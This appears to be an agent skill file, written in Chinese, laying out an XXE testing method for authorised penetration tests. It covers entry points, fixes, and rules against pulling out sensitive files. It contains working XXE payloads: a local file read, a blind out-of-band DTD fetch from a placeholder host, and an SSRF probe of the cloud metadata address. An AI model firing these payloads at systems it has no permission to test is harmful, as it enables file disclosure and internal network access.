---
name: offensive-xxe
description: 在已授权测试中检测 XML 外部实体注入（XXE）时调用。覆盖经典回显、盲 XXE 带外、参数实体、SVG/文档载体与 SSRF 联动，强调最小化取证。
license: MIT
---

# XXE — 授权测试方法论

> **授权前提**：确认 XXE 以“外部实体被解析”为止。文件读取仅取非敏感证据（如 `/etc/hostname` 的存在性或自建测试文件内容），禁止外带 `/etc/shadow`、私钥、配置凭证等敏感文件的完整内容；带外通道指向自有端点。

## 快速流程

1. 找出所有接受 XML 的入口：API body、SOAP、SAML、RSS 导入、文档上传（docx/xlsx/svg）。
2. 测试外部实体是否被解析（回显或带外）。
3. 评估可达影响（本地文件读、SSRF、DoS 风险——不实际触发 DoS）。
4. 取最小证据，给出禁用外部实体的修复建议。

## 经典回显

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<r>&x;</r>
```

无直接回显时，尝试将实体放入会被返回的字段。

## 盲 XXE（带外）

```xml
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://自有端点/evil.dtd">
  %ext;
]>
```

外部 DTD 用参数实体把读到的内容拼进请求回连自有服务器确认。仅用于验证通道，不外带敏感内容。

## 载体与联动

- **SVG/文档**：上传点的 SVG、docx（解压后的 `document.xml`）可承载 XXE，结合 `offensive-file-upload`。
- **SSRF**：`SYSTEM "http://169.254.169.254/..."` 让解析器发起内网请求，结合 `offensive-ssrf` 的最小化原则。
- **DoS**：十亿笑（entity 膨胀）**仅做风险说明，不实际触发**。

## 修复建议

禁用 DTD/外部实体解析（各语言 XML 库的安全配置）；使用不处理 DTD 的解析器；对 SAML/SOAP 等必须场景用白名单与安全库版本。

## 边界与禁止

| 禁止 | 替代 |
|---|---|
| 外带 shadow/私钥/凭证完整内容 | 读 `/etc/hostname` 或自建测试文件证明 |
| 实际触发 entity 膨胀 DoS | 文字说明风险，不执行 |
| 带外回连第三方 | 仅回连自有端点 |
